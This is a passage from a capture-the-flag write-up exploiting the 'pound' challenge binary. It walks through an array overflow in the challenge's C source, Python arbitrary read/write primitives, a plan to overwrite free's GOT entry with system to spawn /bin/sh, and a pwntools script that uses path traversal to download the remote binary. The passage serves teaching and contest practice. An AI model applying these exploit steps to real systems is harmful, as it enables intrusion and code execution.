<span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">=</span><span style="color:#4C9A91">0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> L1</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#758575DD">        // At random, swap money to keep circulation of money </span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#80A665">rand</span><span style="color:#666666">()</span><span style="color:#CB7676"> %</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">            int</span><span style="color:#DBD7CAEE"> tmp </span><span style="color:#666666">=</span><span style="color:#BD976A"> global</span><span style="color:#666666">.</span><span style="color:#BD976A">s1_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#BD976A">            global</span><span style="color:#666666">.</span><span style="color:#BD976A">s1_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#BD976A">            global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> tmp</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">        }</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">        // Propagate forward s1</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">s1_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#CB7676"> >=</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">            global</span><span style="color:#666666">.</span><span style="color:#BD976A">s1_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#CB7676"> -=</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            global</span><span style="color:#666666">.</span><span style="color:#BD976A">s1_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> +=</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">            // If we reach a bankrupt person, </span></span>
<span class="line"><span style="color:#758575DD">            // give him the money</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">s1_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">                return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">        // Propagate forward s2</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#CB7676"> >=</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">            global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#CB7676"> -=</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> +=</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">            // If we reach a bankrupt person, </span></span>
<span class="line"><span style="color:#758575DD">            // give him the money</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">                return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">j</span><span style="color:#666666">=</span><span style="color:#4C9A91">0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> j </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> length_diff</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> j</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#758575DD">        // Propagate forward s2</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">j</span><span style="color:#666666">]</span><span style="color:#CB7676"> >=</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">            global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">j</span><span style="color:#666666">]</span><span style="color:#CB7676"> -=</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">j</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> +=</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">            printf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%d</span><span style="color:#C98A7D">:0x</span><span style="color:#C99076">%x\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">j</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">j</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">]);</span></span>
<span class="line"><span style="color:#758575DD">            // If we reach a bankrupt person, </span></span>
<span class="line"><span style="color:#758575DD">            // give him the money</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">j</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> k</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">                return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>As we can see the propagation is done simultaneously until L1 is reached ( main() imposes <code>s2_citizens >= s1_citizens</code> ) and then continues for state_2 till <code>lenght_diff</code> is reached. Good, having something like <code>9;1</code> in L2 and <code>2</code> in L1 will force our program to believe <code>lenght_diff = 9;</code> and later execute <code>1 - 2;</code> instruction (which is useless but still valid), making the second for loop overflow <code>s2_citizens</code> array. With this solid vulnerability the exploit starts developing around the possible use we could make of <code>char *announcement;</code>. If we could overflow <code>global</code> structure (saved in .bss) and reach this pointer arbitrary read/write is basically achieved trough the use of functions <code>print_states()</code>(for reading) and<code>create_announcement ()</code>(for writing):</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#CB7676">void</span><span style="color:#80A665"> print_states</span><span style="color:#666666"> ()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">announcement</span><span style="color:#CB7676"> !=</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">        printf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">PSA: </span><span style="color:#C99076">%s\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> global</span><span style="color:#666666">.</span><span style="color:#BD976A">announcement</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">    printf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">State of the world!</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">    // Macros are beutiful aren't they...</span></span>
<span class="line"><span style="color:#80A665">    PSTATE</span><span style="color:#666666">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">    printf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">-----------------------</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">    PSTATE</span><span style="color:#666666">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> ANNOUNCEMENT_MAX_LEN</span><span style="color:#4C9A91"> 1024</span></span>
<span class="line"><span style="color:#CB7676">void</span><span style="color:#80A665"> create_announcement</span><span style="color:#666666"> ()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> len</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">    printf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter the length of your announcement: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">    len </span><span style="color:#666666">=</span><span style="color:#80A665"> get_number</span><span style="color:#666666">();</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">len </span><span style="color:#CB7676">&#x3C;=</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> ||</span><span style="color:#DBD7CAEE"> len </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 1024</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">        printf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ERR: Invalid Length</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">announcement_length</span><span style="color:#CB7676"> &#x3C;</span><span style="color:#DBD7CAEE"> len</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">        // Use new buffer</span></span>
<span class="line"><span style="color:#80A665">        remove_announcement</span><span style="color:#666666"> ();</span></span>
<span class="line"><span style="color:#BD976A">        global</span><span style="color:#666666">.</span><span style="color:#BD976A">announcement</span><span style="color:#666666"> =</span><span style="color:#80A665"> malloc</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">len</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">        //printf("Malloced %p\n", global.announcement);</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">announcement</span><span style="color:#CB7676"> ==</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">            printf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ERR: Failed to allocate announcement</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">            return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#BD976A">        global</span><span style="color:#666666">.</span><span style="color:#BD976A">announcement_length</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> len</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">    // Re-use available buffer</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#80A665">fgets</span><span style="color:#666666"> (</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">announcement</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> len</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stdin</span><span style="color:#666666">)</span><span style="color:#CB7676"> ==</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">        printf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Failed to read announcement</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">        exit</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">69</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#BD976A">    global</span><span style="color:#666666">.</span><span style="color:#BD976A">announcement</span><span style="color:#666666">[</span><span style="color:#80A665">strcspn</span><span style="color:#666666">(</span><span style="color:#BD976A">global</span><span style="color:#666666">.</span><span style="color:#BD976A">announcement</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)]</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>Since both <code>char s1_name[STATE_SIZE_LEN];</code> and <code>char s2_name[STATE_SIZE_LEN];</code> varibales separates us from reaching the announcement pointer, we need to find something pretty bigger than <code>9</code> to reach it. Good enough we can use global variable <code>const int N = 1024;</code> to do the trick. Did our math and found two possible assignments for L1 and L2 : <code>258</code> , <code>N;k</code>. With this in mind we developed the idea of the two basic primitives as follows:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> read_at</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">address</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">	amount </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> address</span></span>
<span class="line"><span style="color:#DBD7CAEE">	initialize_citizens</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">amount</span><span style="color:#666666">)</span><span style="color:#758575DD"> # using void init_states(int k) -- option 1 in void menu()</span></span>
<span class="line"><span style="color:#DBD7CAEE">	propagate_forward</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">amount</span><span style="color:#666666">)</span><span style="color:#758575DD"> # pushing our address value in the first 4 bytes of char s1_name</span></span>
<span class="line"><span style="color:#DBD7CAEE">	initialize_citizens</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">)</span><span style="color:#758575DD"> # sets the arrays to 0, address is now only in char s1_name</span></span>
<span class="line"><span style="color:#4D9375">	for</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i </span><span style="color:#CB7676">in</span><span style="color:#BD976A"> xrange</span><span style="color:#666666">(</span><span style="color:#4C9A91">256</span><span style="color:#666666">)):</span></span>
<span class="line"><span style="color:#DBD7CAEE">		propagate_fw</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">amount</span><span style="color:#666666">)</span><span style="color:#758575DD"> # our address is moving forward reaching char* announcement</span></span>
<span class="line"><span style="color:#DBD7CAEE">	leak = extract_leak</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">print_states</span><span style="color:#666666">())</span><span style="color:#758575DD"> # void print_states() actually prints *announcement</span></span>
<span class="line"><span style="color:#4D9375">	return</span><span style="color:#DBD7CAEE"> leak</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">def</span><span style="color:#DBD7CAEE"> write_at</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">what</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">where</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">	amount = where</span></span>
<span class="line"><span style="color:#DBD7CAEE">	initialize_citizens</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">amount</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">	propagate_forward</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">amount</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	initialize_citizens</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">	for</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i </span><span style="color:#CB7676">in</span><span style="color:#BD976A"> xrange</span><span style="color:#666666">(</span><span style="color:#4C9A91">256</span><span style="color:#666666">)):</span></span>
<span class="line"><span style="color:#DBD7CAEE">		propagate_fw</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">amount</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	create_announcement</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">what</span><span style="color:#666666">)</span><span style="color:#758575DD"> # using void create_announcement() to write at *announcement</span></span>
<span class="line"></span></code></pre>
<p>With this two basic primitives the attack strategy is pretty easy:</p>
<ol>
<li>We leak at <code>free_in_got</code> to get <code>free_in_libc_at_runtime</code></li>
<li>We calculate the offset from libc to obtain <code>system_in_libc_at_runtime</code></li>
<li>We write <code>system_in_libc_at_runtim</code> at <code>free_in_got</code></li>
<li>We create an announcement containing <code>/bin/sh\x00</code></li>
<li>We call <code>remove_announcement()</code>, this will trigger <code>system(/bin/sh\x00)</code></li>
</ol>
<p><br>Ok, we got the basic idea, now we have to apply it. We still face a couple issues:</p>
<ol>
<li>We need the libc used by the remote binary to calculate <code>system_in_libc_at_runtime</code></li>
<li>We need the exact binary compiled by the remote host to know <code>free_in_got</code>, since our version of clang could compile a different one (we found out this was the case).</li>
</ol>
<p><br>Leaking libc is not a big deal, we still have the read_tweet() function on our side. We can use it on something like <code>../../../../lib/i386-linux-gnu/libc.so.6</code> ( we already had it leaked from a previus pwning challenge but verified this worked aswell). To leak the binary the procedure was slightly more difficult since the file name was choosen according to:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">str_to_hash </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">[]</span><span style="color:#C99076">{0}</span><span style="color:#C98A7D">[]</span><span style="color:#C99076">{1}</span><span style="color:#C98A7D">##END</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">input2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">sim_id </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> hashlib</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sha256</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">str_to_hash</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">hexdigest</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">sim_name </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">sims/sim-</span><span style="color:#C99076">{0}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sim_id</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">isfile</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sim_name</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Sim compiled, running sim...</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#4D9375">else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Compiling Sim</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">    ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> subprocess</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">call</span><span style="color:#666666">([</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">clang</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-m32</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-DL1=</span><span style="color:#C99076">{}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input1</span><span style="color:#666666">),</span></span>
<span class="line"><span style="color:#C98A7D77">                    "</span><span style="color:#C98A7D">-DL2=</span><span style="color:#C99076">{}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input2</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">pound.c</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-o</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    sim_name</span><span style="color:#666666">])</span></span>
<span class="line"></span></code></pre>
<p>We made a custom script to download it:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span></span>
<span class="line"><span style="color:#DBD7CAEE">​</span></span>
<span class="line"><span style="color:#DBD7CAEE">r </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">pound.pwning.xxx</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 9765</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">​</span><span style="color:#B8A965">print</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Quit</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">20)</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">str_to_hash </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">[]258[]N;k##END</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">sim_id </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> hashlib</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sha256</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">str_to_hash</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">hexdigest</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">to_send </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">../sims/sim-</span><span style="color:#C99076">{0}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sim_id</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">to_send</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">binary_data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">1. Read Trump article</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">f </span><span style="color:#666666">=</span><span style="color:#B8A965"> open</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">binary</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">w</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">binary</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#666666">()</span></span>
